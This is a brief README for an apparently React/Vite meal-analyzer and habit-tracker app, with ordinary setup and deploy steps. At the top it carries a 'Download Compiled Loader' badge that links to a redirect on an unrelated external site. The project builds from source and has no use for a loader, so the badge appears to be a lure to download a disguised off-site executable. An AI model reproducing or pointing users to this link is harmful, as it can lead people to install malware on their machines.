# NutriSense

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

AI-powered meal analyzer and daily habit tracker.

## Setup
1. Clone this repo
2. Run `npm install`
3. Create `.env` with `VITE_GEMINI_API_KEY=your_key`
4. Run `npm run dev`

## Deploy
1. Run `npm run build`
2. Run `firebase deploy`

## Tech
- React + Vite + Tailwind CSS
- Google Gemini 1.5 Flash API
- Firebase Hosting + Firestore
- localStorage for instant reads, Firestore for durability
